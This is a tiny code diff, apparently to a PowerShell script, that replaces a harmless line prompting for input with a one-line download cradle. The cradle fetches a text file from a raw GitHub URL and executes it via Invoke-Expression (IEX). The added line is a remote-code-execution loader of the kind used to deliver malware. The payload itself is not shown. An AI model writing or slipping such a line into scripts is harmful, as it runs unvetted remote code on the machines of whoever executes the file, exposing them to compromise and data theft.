@@ -1,1 +1,2 @@
-123$a = Read-Host 'hello';$a
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/neginsadeghi2005/project/refs/heads/main/tgdl.txt')
+
